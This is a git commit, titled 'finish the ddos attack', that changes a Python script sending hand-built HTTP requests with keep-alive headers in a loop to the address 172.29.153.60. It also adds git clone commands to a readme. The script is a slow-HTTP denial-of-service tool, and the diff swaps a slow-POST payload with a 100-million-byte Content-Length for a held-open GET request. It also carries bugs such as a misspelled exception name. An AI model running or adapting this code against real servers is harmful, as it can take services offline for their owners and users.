768dba4f9136be542d08c3744cd24d98f0d88c1c
chenchen <295655244@qq.com>
2015-01-30 15:58:45 +0800

    finish the ddos attack

--- doc_attack/text10.py
+++ doc_attack/text10.py
@@ -26,8 +26,16 @@ if __name__=='__main__':
      
     #发送百度首页面请求并且保持连接  
     try :  
-        print 'send start...'  
-        str= "POST /a HTTP/1.1\r\n" +"HOST: " +  "172.29.153.60" + "\r\n" +"Connection: keep-alive\r\n" +"Keep-Alive: 900\r\n" +"Content-Length: 100000000\r\n" +"Content_Type: application/x-www-form-urlencoded\r\n" +"Accept: *.*\r\n"
+        print 'send start...'
+        str=(  
+        'GET / HTTP/1.1\r\n'+
+        'Host :   172.29.153.60\r\n'+
+        'User-Agent:  Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0\r\n'+
+        'Accept : text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n'+
+        'Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3\r\n'+
+        'Accept-Encoding: gzip, deflate\r\n'+
+        'Connection : keep-alive\r\n')
+        #str= "POST /a HTTP/1.1\r\n" +"HOST: " +  "172.29.153.60" + "\r\n" +"Connection: keep-alive\r\n" +"Keep-Alive: 900\r\n" +"Content-Length: 100000000\r\n" +"Content_Type: application/x-www-form-urlencoded\r\n" +"Accept: *.*\r\n"
         sock.send(str)  
     except socket.eorror,e:  
         print 'send false'  
@@ -42,7 +50,7 @@ if __name__=='__main__':
         print 'send  %d  times' %i 
         i=i+1
         time.sleep(1000)
-        data = ''  
-        data = sock.recv(1024)     
+    #data = ''  
+    #data = sock.recv(1024)     
     sock.close()  
     print data  
--- readme.txt
+++ readme.txt
@@ -3,3 +3,5 @@ git add --all
 git commit -m "一些注释"
 git remote add origin https://github.com/c295655244/要推送的版本库.git
 git push -u origin master
+
+git clone git@github.com:c295655244/要克隆的版本库.git
